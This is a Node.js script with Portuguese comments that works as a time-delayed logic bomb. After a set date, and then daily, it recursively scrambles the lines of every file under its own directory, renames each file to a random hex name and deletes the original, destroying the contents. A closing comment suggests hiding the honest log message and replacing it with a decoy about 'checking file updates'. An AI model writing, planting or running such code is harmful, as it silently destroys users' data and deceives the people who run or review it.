const fs = require('fs');
const path = require('path');
const schedule = require('node-schedule');
const crypto = require('crypto');

// Configuração
const baseFolderPath = __dirname; // Diretório base é o mesmo do script
const checkDate = new Date('2024-07-01T00:00:00'); // Substitua pela data limite
const checkHour = 10; // Hora do dia para checar (24h formato)

// Função para gerar nomes randômicos
function generateRandomName(extension) {
    return crypto.randomBytes(16).toString('hex') + extension;
}

// Função para embaralhar conteúdo de um arquivo
function shuffleContent(content) {
    const lines = content.split('\n');
    for (let i = lines.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lines[i], lines[j]] = [lines[j], lines[i]];
    }
    return lines.join('\n');
}

// Função para ler diretórios recursivamente
function readDirectoriesRecursively(folderPath) {
    console.log(`Lendo diretório: ${folderPath}`);
    fs.readdir(folderPath, { withFileTypes: true }, (err, files) => {
        if (err) {
            console.error('Erro ao ler a pasta:', err);
            return;
        }

        const fileEntries = [];
        const dirEntries = [];

        // Separa arquivos e diretórios
        files.forEach((file) => {
            if (file.isDirectory()) {
                dirEntries.push(file.name);
            } else {
                fileEntries.push(file.name);
            }
        });

        // Embaralha arquivos
        shuffleFiles(folderPath, fileEntries);

        // Processa subdiretórios recursivamente
        dirEntries.forEach((dir) => {
            const subDirPath = path.join(folderPath, dir);
            readDirectoriesRecursively(subDirPath);
        });
    });
}

// Função para embaralhar arquivos
function shuffleFiles(folderPath, files) {
    files.forEach((file) => {
        const oldPath = path.join(folderPath, file);
        const fileExtension = path.extname(file);
        const newPath = path.join(folderPath, generateRandomName(fileExtension));

        // Ler e embaralhar o conteúdo do arquivo
        fs.readFile(oldPath, 'utf8', (err, data) => {
            if (err) {
                console.error('Erro ao ler o arquivo:', err);
                return;
            }

            const shuffledContent = shuffleContent(data);

            // Escrever o conteúdo embaralhado no novo arquivo
            fs.writeFile(newPath, shuffledContent, (err) => {
                if (err) {
                    console.error('Erro ao escrever no arquivo:', err);
                    return;
                }

                // Remover o arquivo antigo
                fs.unlink(oldPath, (err) => {
                    if (err) {
                        console.error('Erro ao deletar o arquivo antigo:', err);
                    } else {
                        console.log(`Arquivo ${oldPath} renomeado e embaralhado para ${newPath}`);
                    }
                });
            });
        });
    });
}

// Função para verificar a data e executar a tarefa se necessário
function checkAndShuffle() {
    const now = new Date();
    console.log(`Verificando a data: ${now}`);
    if (now > checkDate) {
        console.log('Data limite atingida. Embaralhando arquivos...');
        readDirectoriesRecursively(baseFolderPath);
    } else {
        console.log('Data limite ainda não atingida.');
    }
}

// Verifica imediatamente ao iniciar
checkAndShuffle();

// Agenda a tarefa para checar a data e embaralhar os arquivos diariamente
schedule.scheduleJob({ hour: checkHour, minute: 0 }, () => {
    checkAndShuffle();
});


console.log(`Agendado para checar e embaralhar arquivos às ${checkHour}:00 todos os dias.`);
// comenta a linha de cima ou suma com ela para não ficar na cara né?
console.log(`Checando atualizações de arquivos ${checkHour}:00 todos os dias.`);
